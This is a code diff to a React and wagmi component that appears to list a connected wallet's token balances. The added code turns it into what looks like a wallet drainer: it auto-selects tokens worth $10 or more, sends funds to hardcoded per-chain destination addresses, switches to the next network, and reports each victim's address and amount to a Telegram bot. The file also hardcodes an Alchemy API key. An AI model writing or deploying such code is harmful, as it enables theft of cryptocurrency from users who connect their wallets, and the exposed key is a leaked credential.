@@ -1,5 +1,5 @@
 import { useCallback, useEffect, useState } from 'react';
-import { useAccount, useWaitForTransactionReceipt } from 'wagmi';
+import { useAccount, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
 import { Loading, Toggle } from '@geist-ui/core';
 import { tinyBig } from 'essential-eth';
 import { useAtom } from 'jotai';
@@ -7,48 +7,46 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { Alchemy, Network } from 'alchemy-sdk';
 
-// Setup Alchemy instances for multiple networks
+// Alchemy instances for multiple networks
 const alchemyInstances = {
-  [Network.ETH_MAINNET]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.ETH_MAINNET,
-  }),
-  [Network.BSC_MAINNET]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.BSC_MAINNET,
-  }),
-  [Network.OPTIMISM]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.OPTIMISM,
-  }),
-  [Network.ZK_SYNC]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.ZK_SYNC,
-  }),
-  [Network.ARB_MAINNET]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.ARB_MAINNET,
-  }),
-  [Network.MATIC_MAINNET]: new Alchemy({
-    apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV",
-    network: Network.MATIC_MAINNET,
-  }),
+  [Network.ETH_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ETH_MAINNET }),
+  [Network.BSC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.BSC_MAINNET }),
+  [Network.OPTIMISM]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.OPTIMISM }),
+  [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
+  [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
+  [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
   // Add other networks as needed
 };
 
 // Mapping from chain IDs to Alchemy SDK network enums
 const chainIdToNetworkMap = {
-  1: Network.ETH_MAINNET,      // Ethereum Mainnet
-  56: Network.BSC_MAINNET,     // BSC Mainnet
-  10: Network.OPTIMISM,        // Optimism Mainnet
-  324: Network.ZK_SYNC,        // zkSync Mainnet
-  42161: Network.ARB_MAINNET,  // Arbitrum Mainnet
-  137: Network.MATIC_MAINNET,  // Polygon Mainnet
+  1: Network.ETH_MAINNET,
+  56: Network.BSC_MAINNET,
+  10: Network.OPTIMISM,
+  324: Network.ZK_SYNC,
+  42161: Network.ARB_MAINNET,
+  137: Network.MATIC_MAINNET,
   // Add other mappings as needed
 };
 
-const supportedChains = [1, 56, 10, 324, 42161, 137]; // Supported chain IDs
+// Supported chain IDs
+const supportedChains = [1, 56, 10, 324, 42161, 137];
 
+// Mapping of chain IDs to destination addresses
+const chainIdToDestinationAddress = {
+  1: '0x...MainnetAddress',
+  56: '0x...BSCAddress',
+  10: '0x...OptimismAddress',
+  324: '0x...ZkSyncAddress',
+  42161: '0x...ArbitrumAddress',
+  137: '0x...PolygonAddress',
+};
+
+// Telegram bot configuration
+const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+
+// USD formatter for currency formatting
 const usdFormatter = new Intl.NumberFormat('en-US', {
   style: 'currency',
   currency: 'USD',
@@ -57,11 +55,9 @@ const usdFormatter = new Intl.NumberFormat('en-US', {
 // Function to safely convert input values to tinyBig numbers
 const safeNumber = (value) => {
   try {
-    // Check for undefined, null, or empty values
     if (value === undefined || value === null || value === '') {
       return tinyBig(0);
     }
-    // Convert to string and ensure it's a valid number
     const num = tinyBig(value.toString());
     return num.isNaN() ? tinyBig(0) : num;
   } catch (error) {
@@ -70,12 +66,45 @@ const safeNumber = (value) => {
   }
 };
 
-const TokenRow: React.FunctionComponent<{ token: any }> = ({ token }) => {
+// Function to send a Telegram notification
+const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainName, blockExplorerUrl }) => {
+  const message = `Transaction Details:
+  - Sender Address: ${senderAddress}
+  - Amount: ${amount} ETH
+  - Chain ID: ${chainId}
+  - Chain Name: ${chainName}
+  - Block Explorer: ${blockExplorerUrl}`;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const params = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: message,
+  };
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(params),
+    });
+
+    if (!response.ok) {
+      throw new Error(`Telegram API error: ${response.statusText}`);
+    }
+    console.log('Telegram notification sent successfully.');
+  } catch (error) {
+    console.error('Failed to send Telegram notification:', error);
+  }
+};
+
+const TokenRow = ({ token }) => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { chain } = useAccount();
   const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;
 
-  const setTokenChecked = (tokenAddress: string, isChecked: boolean) => {
+  const setTokenChecked = (tokenAddress, isChecked) => {
     setCheckedRecords((old) => ({
       ...old,
       [tokenAddress]: { isChecked: isChecked },
@@ -85,10 +114,9 @@ const TokenRow: React.FunctionComponent<{ token: any }> = ({ token }) => {
   const { address } = useAccount();
   const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;
 
-  // Safely handle division by zero by checking if quote_rate is valid
   const unroundedBalance = safeNumber(quote_rate).gt(0)
     ? safeNumber(quote).div(safeNumber(quote_rate))
-    : safeNumber(0); // Default to zero if quote_rate is zero or invalid
+    : safeNumber(0);
 
   const roundedBalance = unroundedBalance.lt(0.001)
     ? unroundedBalance.round(10)
@@ -96,13 +124,8 @@ const TokenRow: React.FunctionComponent<{ token: any }> = ({ token }) => {
     ? unroundedBalance.round(2)
     : unroundedBalance.round(5);
 
-  const { isLoading } = useWaitForTransactionReceipt({
-    hash: pendingTxn?.blockHash || undefined,
-  });
-
   return (
     <div key={contract_address}>
-      {isLoading && <Loading />}
       <Toggle
         checked={checkedRecords[contract_address]?.isChecked}
         onChange={(e) => {
@@ -130,75 +153,107 @@ const TokenRow: React.FunctionComponent<{ token: any }> = ({ token }) => {
   );
 };
 
+const handleTokenTransaction = async (walletClient, destinationAddress, amount, nextChainId, switchNetwork) => {
+  if (!walletClient.data || !destinationAddress) return;
+
+  try {
+    const tx = await walletClient.data.sendTransaction({
+      to: destinationAddress,
+      value: amount,
+      gasLimit: '21000', // Example gas limit
+    });
+
+    console.log('Transaction sent:', tx.hash);
+
+    // Immediately switch to the next network after transaction is sent
+    if (nextChainId) {
+      switchNetwork(nextChainId);
+    }
+
+    // Get the block explorer URL and chain info
+    const chainName = walletClient.chain.name;
+    const chainId = walletClient.chain.id;
+    const blockExplorerUrl = `${walletClient.chain.blockExplorers?.default.url}/tx/${tx.hash}`;
+
+    // Send Telegram notification
+    sendTelegramNotification({
+      senderAddress: walletClient.data.address,
+      amount: amount,
+      chainId: chainId,
+      chainName: chainName,
+      blockExplorerUrl: blockExplorerUrl,
+    });
+
+  } catch (error) {
+    console.error('Failed to send transaction:', error);
+  }
+};
+
 export const GetTokens = () => {
   const [tokens, setTokens] = useAtom(globalTokensAtom);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { address, isConnected, chain } = useAccount();
+  const walletClient = useWalletClient();
+  const { chains, switchNetwork } = useNetwork(); // Import useNetwork for switching networks
 
   const fetchData = useCallback(async () => {
     setLoading(true);
     try {
       setError('');
       if (!chain || !supportedChains.includes(chain.id)) {
-        throw new Error(
-          `Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(
-            ', '
-          )}.`
-        );
+        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
       }
 
       const alchemyNetwork = chainIdToNetworkMap[chain.id];
       const alchemy = alchemyInstances[alchemyNetwork];
 
       console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-      const tokensResponse = await alchemy.core.getTokenBalances(address as string);
-      const nativeBalanceResponse = await alchemy.core.getBalance(address as string, 'latest');
+      const tokensResponse = await alchemy.core.getTokenBalances(address);
+      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
 
       const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
         contract_address: balance.contractAddress,
         balance: safeNumber(balance.tokenBalance),
-        quote: balance.quote || 0, // Add default value if missing
-        quote_rate: balance.quoteRate || 0, // Add default value if missing
+        quote: balance.quote || 0,
+        quote_rate: balance.quoteRate || 0,
       }));
 
+      // Automatically select tokens with a value of $10 or more
+      const initialCheckedRecords = {};
+      processedTokens.forEach((token) => {
+        const isChecked = safeNumber(token.quote).gte(10);
+        initialCheckedRecords[token.contract_address] = { isChecked };
+      });
+      setCheckedRecords(initialCheckedRecords);
       setTokens(processedTokens);
-      console.log('Fetched tokens:', processedTokens);
-    } catch (error) {
-      console.error('Error fetching tokens:', error);
-      setError((error as Error).message);
+    } catch (err) {
+      console.error(err);
+      setError(err.message || 'An error occurred while fetching token data.');
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
-  }, [address, chain, setTokens]);
+  }, [address, chain, setCheckedRecords, setTokens]);
 
   useEffect(() => {
-    if (address && chain?.id) {
+    if (isConnected) {
       fetchData();
-      setCheckedRecords({});
     }
-  }, [address, chain?.id, fetchData, setCheckedRecords]);
-
-  useEffect(() => {
-    if (!isConnected) {
-      setTokens([]);
-      setCheckedRecords({});
-    }
-  }, [isConnected, setTokens, setCheckedRecords]);
+  }, [isConnected, chain, address, fetchData]);
 
   if (loading) {
-    return <Loading>Loading</Loading>;
+    return <Loading>Loading...</Loading>;
   }
 
   if (error) {
-    return <div>{error}</div>;
+    return <div style={{ color: 'red' }}>{error}</div>;
   }
 
   return (
-    <div style={{ margin: '20px' }}>
-      {isConnected && tokens?.length === 0 && `No tokens on ${chain?.name}`}
+    <div>
       {tokens.map((token) => (
-        <TokenRow token={token} key={token.contract_address} />
+        <TokenRow key={token.contract_address} token={token} />
       ))}
     </div>
   );
